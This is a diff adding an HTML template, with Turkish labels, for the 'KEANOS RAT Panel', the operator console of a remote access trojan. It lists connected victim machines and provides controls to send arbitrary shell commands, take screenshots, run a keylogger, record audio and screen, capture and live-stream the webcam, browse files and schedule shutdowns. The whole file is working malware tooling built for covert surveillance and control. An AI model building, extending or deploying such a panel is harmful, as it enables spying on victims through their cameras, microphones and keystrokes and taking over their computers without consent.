@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>KEANOS RAT Panel</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body { background: #181a1b; color: #eee; }
+        .keanos-header { font-family: monospace; font-size: 1.1rem; white-space: pre; color: #00e6e6; }
+        .client-table th, .client-table td { color: #fff; }
+    </style>
+</head>
+<body>
+<div class="container mt-4">
+    <div class="keanos-header mb-4">
+        <pre>
+                               ___====-_  _-====___
+                         _--^^^#####//      \\#####^^^--_
+                      _-^##########// (    ) \\##########^-_
+                     -############//  |\^^/|  \\############-
+                   _/############//   (@::@)   \\############\_
+                  /#############((     \\//     ))#############\
+                 -###############\\    (oo)    //###############-
+                -#################\\  / UUU \  //#################-
+                -###################\\/  (_)  \//###################-
+                _#/|##########/\######(   /|\   )######/\##########|\#_
+                |/ |#/\#/\#/\/  \#/\##\  |||  /##/\#/  \/\#/\#/\#| \
+                ||/  V  V '   V  |||##\  ||| /##|||  V   '  V  V  \||
+                ||| \ \|  | /  ||||||###\|||/###|||||  \ | /  |/ / |||
+                |||  |_|_|_|  ||||||###########||||||   |_|_|_|  |||
+                ||\  |||||    |||||###########||||||    |||||  /|||
+        </pre>
+        <b>KEANOS REMOTE ACCESS PANEL</b>
+    </div>
+    <div class="mb-3">
+        <a href="/upload" class="btn btn-success">Dosya Yöneticisi</a>
+        <a href="#" onclick="goToClientOutput()" class="btn btn-info">Client Çıktısı</a>
+        <a href="#" onclick="goToScreenshot()" class="btn btn-warning">Ekran Görüntüsü</a>
+        <a href="#" onclick="goToWebcam()" class="btn btn-danger">Webcam</a>
+        <a href="#" onclick="goToKeylogger()" class="btn btn-secondary">Keylogger</a>
+        <a href="#" onclick="goToSysinfo()" class="btn btn-primary">Sistem Bilgisi</a>
+        <a href="#" onclick="goToExplorer()" class="btn btn-dark">Dosya Gezgini</a>
+        <a href="#" onclick="goToScreenrec()" class="btn btn-warning">Ekran Kaydı</a>
+        <a href="#" onclick="goToAlertmsg()" class="btn btn-danger">Alert Gönder</a>
+        <a href="#" onclick="goToAudiorec()" class="btn btn-info">Ses Kaydı</a>
+        <a href="#" onclick="goToShutdownTimer()" class="btn btn-danger">Kapatma Zamanlayıcı</a>
+        <a href="#" onclick="goToWebcamrec()" class="btn btn-dark">Webcam Video</a>
+        <a href="#" onclick="goToGoogleSearch()" class="btn btn-info">Google Arama</a>
+        <a href="#" onclick="goToWebcamStream()" class="btn btn-success">Canlı Webcam İzle</a>
+    </div>
+    <h2>Bağlı Clientlar</h2>
+    <table class="table table-dark table-striped client-table">
+        <thead>
+            <tr>
+                <th>#</th>
+                <th>Hostname</th>
+                <th>Son Görülme</th>
+                <th>Komut</th>
+                <th>Gönder</th>
+                <th>Çıktı</th>
+                <th>Ekran Görüntüsü</th>
+                <th>Webcam</th>
+                <th>Keylogger</th>
+                <th>Sistem Bilgisi</th>
+                <th>Dosya Gezgini</th>
+                <th>Ekran Kaydı</th>
+                <th>Alert Gönder</th>
+                <th>Ses Kaydı</th>
+                <th>Kapatma Zamanlayıcı</th>
+                <th>Webcam Video</th>
+                <th>Google Arama</th>
+                <th>Canlı Webcam İzle</th>
+            </tr>
+        </thead>
+        <tbody id="client-table-body">
+        {% for c in clients %}
+            <tr>
+                <td>{{ loop.index }}</td>
+                <td>{{ c.hostname }}</td>
+                <td>{{ c.last_seen }}</td>
+                <td>
+                    <input type="text" class="form-control form-control-sm command-input" id="cmd-{{ c.id }}" placeholder="Komut yaz...">
+                </td>
+                <td>
+                    <button class="btn btn-sm btn-primary" onclick="sendCommand('{{ c.id }}')">Gönder</button>
+                </td>
+                <td>
+                    <a href="/client_output?id={{ c.id }}" class="btn btn-sm btn-secondary">Çıktı Gör</a>
+                </td>
+                <td>
+                    <a href="/screenshot?id={{ c.id }}" class="btn btn-sm btn-warning">Ekran Görüntüsü</a>
+                </td>
+                <td>
+                    <a href="/webcam?id={{ c.id }}" class="btn btn-sm btn-danger">Webcam</a>
+                </td>
+                <td>
+                    <a href="/keylogger?id={{ c.id }}" class="btn btn-sm btn-secondary">Keylogger</a>
+                </td>
+                <td>
+                    <a href="/sysinfo?id={{ c.id }}" class="btn btn-sm btn-primary">Sistem Bilgisi</a>
+                </td>
+                <td>
+                    <a href="/explorer?id={{ c.id }}" class="btn btn-sm btn-dark">Dosya Gezgini</a>
+                </td>
+                <td>
+                    <a href="/screenrec?id={{ c.id }}" class="btn btn-sm btn-warning">Ekran Kaydı</a>
+                </td>
+                <td>
+                    <a href="/alertmsg?id={{ c.id }}" class="btn btn-sm btn-danger">Alert Gönder</a>
+                </td>
+                <td>
+                    <a href="/audiorec?id={{ c.id }}" class="btn btn-sm btn-info">Ses Kaydı</a>
+                </td>
+                <td>
+                    <a href="/shutdown_timer?id={{ c.id }}" class="btn btn-sm btn-danger">Kapatma Zamanlayıcı</a>
+                </td>
+                <td>
+                    <a href="/webcamrec?id={{ c.id }}" class="btn btn-sm btn-dark">Webcam Video</a>
+                </td>
+                <td>
+                    <a href="/google_search?id={{ c.id }}" class="btn btn-sm btn-info">Google Arama</a>
+                </td>
+                <td>
+                    <a href="/webcam_streamer?id={{ c.id }}" class="btn btn-sm btn-success">Canlı Webcam İzle</a>
+                </td>
+            </tr>
+        {% endfor %}
+        </tbody>
+    </table>
+    <div id="result" class="mt-3"></div>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+function sendCommand(clientId) {
+    var cmd = document.getElementById('cmd-' + clientId).value;
+    fetch('/send_command', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: 'client_id=' + encodeURIComponent(clientId) + '&command=' + encodeURIComponent(cmd)
+    })
+    .then(r => r.json())
+    .then(data => {
+        document.getElementById('result').innerHTML = '<div class="alert alert-' + (data.status=='success'?'success':'danger') + '">' + data.message + '</div>';
+    });
+}
+
+function goToClientOutput() {
+    var tbody = document.getElementById('client-table-body');
+    if (tbody && tbody.rows.length > 0) {
+        var id = tbody.rows[0].querySelector('input').id.replace('cmd-', '');
+        window.location = '/client_output?id=' + encodeURIComponent(id);
+    } else {
+        alert('Bağlı client yok!');
+    }
+}
+
+function goToScreenshot() {
+    var tbody = document.getElementById('client-table-body');
+    if (tbody && tbody.rows.length > 0) {
+        var id = tbody.rows[0].querySelector('input').id.replace('cmd-', '');
+        window.location = '/screenshot?id=' + encodeURIComponent(id);
+    } else {
+        alert('Bağlı client yok!');
+    }
+}
+
+function goToWebcam() {
+    var tbody = document.getElementById('client-table-body');
+    if (tbody && tbody.rows.length > 0) {
+        var id = tbody.rows[0].querySelector('input').id.replace('cmd-', '');
+        window.location = '/webcam?id=' + encodeURIComponent(id);
+    } else {
+        alert('Bağlı client yok!');
+    }
+}
+
+function goToKeylogger() {
+    var tbody = document.getElementById('client-table-body');
+    if (tbody && tbody.rows.length > 0) {
+        var id = tbody.rows[0].querySelector('input').id.replace('cmd-', '');
+        window.location = '/keylogger?id=' + encodeURIComponent(id);
+    } else {
+        alert('Bağlı client yok!');
+    }
+}
+
+function goToSysinfo() {
+    var tbody = document.getElementById('client-table-body');
+    if (tbody && tbody.rows.length > 0) {
+        var id = tbody.rows[0].querySelector('input').id.replace('cmd-', '');
+        window.location = '/sysinfo?id=' + encodeURIComponent(id);
+    } else {
+        alert('Bağlı client yok!');
+    }
+}
+
+function goToExplorer() {
+    var tbody = document.getElementById('client-table-body');
+    if (tbody && tbody.rows.length > 0) {
+        var id = tbody.rows[0].querySelector('input').id.replace('cmd-', '');
+        window.location = '/explorer?id=' + encodeURIComponent(id);
+    } else {
+        alert('Bağlı client yok!');
+    }
+}
+
+function goToScreenrec() {
+    var tbody = document.getElementById('client-table-body');
+    if (tbody && tbody.rows.length > 0) {
+        var id = tbody.rows[0].querySelector('input').id.replace('cmd-', '');
+        window.location = '/screenrec?id=' + encodeURIComponent(id);
+    } else {
+        alert('Bağlı client yok!');
+    }
+}
+
+function goToAlertmsg() {
+    var tbody = document.getElementById('client-table-body');
+    if (tbody && tbody.rows.length > 0) {
+        var id = tbody.rows[0].querySelector('input').id.replace('cmd-', '');
+        window.location = '/alertmsg?id=' + encodeURIComponent(id);
+    } else {
+        alert('Bağlı client yok!');
+    }
+}
+
+function goToAudiorec() {
+    var tbody = document.getElementById('client-table-body');
+    if (tbody && tbody.rows.length > 0) {
+        var id = tbody.rows[0].querySelector('input').id.replace('cmd-', '');
+        window.location = '/audiorec?id=' + encodeURIComponent(id);
+    } else {
+        alert('Bağlı client yok!');
+    }
+}
+
+function goToShutdownTimer() {
+    var tbody = document.getElementById('client-table-body');
+    if (tbody && tbody.rows.length > 0) {
+        var id = tbody.rows[0].querySelector('input').id.replace('cmd-', '');
+        window.location = '/shutdown_timer?id=' + encodeURIComponent(id);
+    } else {
+        alert('Bağlı client yok!');
+    }
+}
+
+function goToWebcamrec() {
+    var tbody = document.getElementById('client-table-body');
+    if (tbody && tbody.rows.length > 0) {
+        var id = tbody.rows[0].querySelector('input').id.replace('cmd-', '');
+        window.location = '/webcamrec?id=' + encodeURIComponent(id);
+    } else {
+        alert('Bağlı client yok!');
+    }
+}
+
+function goToGoogleSearch() {
+    var tbody = document.getElementById('client-table-body');
+    if (tbody && tbody.rows.length > 0) {
+        var id = tbody.rows[0].querySelector('input').id.replace('cmd-', '');
+        window.location = '/google_search?id=' + encodeURIComponent(id);
+    } else {
+        alert('Bağlı client yok!');
+    }
+}
+
+function goToWebcamStream() {
+    var tbody = document.getElementById('client-table-body');
+    if (tbody && tbody.rows.length > 0) {
+        var id = tbody.rows[0].querySelector('input').id.replace('cmd-', '');
+        window.location = '/webcam_streamer?id=' + encodeURIComponent(id);
+    } else {
+        alert('Bağlı client yok!');
+    }
+}
+</script>
+</body>
+</html>
